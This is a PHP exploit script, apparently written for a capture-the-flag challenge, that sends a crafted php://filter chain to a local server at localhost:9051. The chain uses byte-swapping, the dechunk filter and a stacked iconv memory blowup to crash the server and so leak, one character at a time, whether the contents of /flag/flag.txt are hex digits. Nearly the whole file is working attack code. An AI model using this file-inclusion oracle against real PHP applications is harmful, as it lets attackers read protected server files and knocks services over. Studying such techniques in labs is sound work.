<?php
// exploit_test/exploit2.php

$url = "http://localhost:9051/index.php";

echo "[*] Testing Swapped First Char of /flag/flag.txt\n";
echo "    Original: 'fl...' (First char 'f' is Hex -> No Crash)\n";
echo "    Swapped:  'lf...' (First char 'l' is Non-Hex -> Crash Expected)\n\n";

// 1. The Swap Filter
// Swaps bytes 1<->2, 3<->4, etc.
// 'flag-arbyci' -> 'lfgaa-brcy...'
$swap = "convert.iconv.UTF-16LE.UTF-16BE";

// 2. The Bomb (Exponential Blowup)
// 29 iterations of doubling size.
$bomb = "convert.iconv.UTF8.UTF16";
for ($i = 0; $i < 29; $i++) {
    $bomb .= "|convert.iconv.UTF8.UTF16";
}

// 3. Construct the Chain
// Apply Swap FIRST, then Dechunk Oracle check.
// Logic:
// - Swap happens. Stream starts with 'l'.
// - Dechunk checks 'l'. It is NOT Hex.
// - Dechunk passes stream to Bomb.
// - Bomb expands.
// - Server Crashes (500).
$payload = "php://filter/read=$swap|dechunk|$bomb/resource=/flag/flag.txt";

echo "[*] Sending Payload...\n";

$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        // content must be URL-encoded for proper transmission of '|', '=', etc.
        'content' => "page=" . urlencode($payload),
        'timeout' => 5
    ]
];

$context = stream_context_create($options);
$start = microtime(true);
$result = @file_get_contents($url, false, $context);
$end = microtime(true);

// 4. Analyze Result
if ($result === FALSE) {
    echo "[-] CRASH DETECTED (500 Error)\n";
    echo "    SUCCESS: The new first character 'l' caused a crash.\n";
    echo "    (Non-Hex character confirmed)\n";
} else {
    echo "[+] NO CRASH (200 OK)\n";
    echo "    FAILURE: The server did NOT crash.\n";
    echo "    (Unexpected for character 'l')\n";
}

echo "    Time: " . round($end - $start, 4) . "s\n";
?>